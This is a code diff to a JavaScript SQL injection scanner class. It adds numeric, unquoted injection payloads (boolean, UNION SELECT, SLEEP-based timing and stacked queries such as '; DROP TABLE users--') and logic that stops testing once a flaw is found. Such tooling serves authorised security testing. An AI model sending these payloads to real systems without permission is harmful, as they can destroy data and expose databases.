@@ -38,6 +38,15 @@ export class SQLInjectionTester {
             stacked: ["'; DROP TABLE users--", "'; SELECT pg_sleep(1)--"],
             time: ["' AND SLEEP({delay})-- -", "'; WAITFOR DELAY '00:00:0{delay}'-- -"]
         };
+        
+        // Add numeric (unquoted) payloads for parameters that don't use quotes
+        this.numericPayloads = {
+            error: ["", "9999999999", "-1"],
+            boolean: [" AND 1=1-- -", " AND 1=2-- -", " OR 1=1-- -", " OR 1=2-- -"],
+            union: [" UNION SELECT {cols}-- -", " UNION ALL SELECT {cols}-- -"],
+            stacked: ["; DROP TABLE users--", "; SELECT pg_sleep(1)--"],
+            time: [" AND SLEEP({delay})-- -", " AND (SELECT 5000 FROM (SELECT(SLEEP({delay})))test)-- -"]
+        };
 
         // Generate payloads on construction
         this.payloads = this._generatePayloads();
@@ -78,7 +87,7 @@ export class SQLInjectionTester {
         payloads.union.push("-999' UNION SELECT 1-- -");
         payloads.union.push("-999' UNION SELECT 1,2-- -");
         payloads.union.push("-999' UNION SELECT 1,2,3-- -");
-
+        
         // Stacked queries – include random benign statements
         payloads.stacked = [];
         const benign = ['SELECT 1', 'SELECT @@version', 'SELECT NULL'];
@@ -88,11 +97,33 @@ export class SQLInjectionTester {
 
         // Time based – vary delays 3-8 seconds
         payloads.time = [];
-        for (let delay = 3; delay <= 6; delay++) {
-            this.basePayloads.time.forEach(t => {
-                payloads.time.push(t.replace('{delay}', delay));
+        const delay = randInt(3, 6);
+        this.basePayloads.time.forEach(t => {
+            payloads.time.push(t.replace(/{delay}/g, delay));
+        });
+        
+        // Add numeric (unquoted) payloads
+        // Numeric error-based
+        payloads.error.push(...this.numericPayloads.error);
+        
+        // Numeric boolean-based
+        payloads.boolean.push(...this.numericPayloads.boolean);
+        
+        // Numeric UNION with columns
+        for (let cols = 1; cols <= 6; cols++) {
+            const list = Array.from({ length: cols }, () => 'NULL').join(',');
+            this.numericPayloads.union.forEach(t => {
+                payloads.union.push(t.replace('{cols}', list));
             });
         }
+        
+        // Numeric stacked queries
+        payloads.stacked.push(...this.numericPayloads.stacked);
+        
+        // Numeric time-based with random delays
+        this.numericPayloads.time.forEach(t => {
+            payloads.time.push(t.replace(/{delay}/g, delay));
+        });
 
         return payloads;
     }
@@ -316,6 +347,16 @@ export class SQLInjectionTester {
                         await new Promise(r => setTimeout(r, this.config.delay));
                     }
                 }
+                // Break out of type loop if vulnerability found
+                if (result.vulnerabilities.length > 0) {
+                    this.logger?.info(`Stopping further tests for parameter '${param}' - vulnerability already found`);
+                    break;
+                }
+            }
+            // Break out of parameter loop if vulnerability found
+            if (result.vulnerabilities.length > 0) {
+                this.logger?.info(`Stopping all tests for URL - vulnerability already found`);
+                break;
             }
         }
 
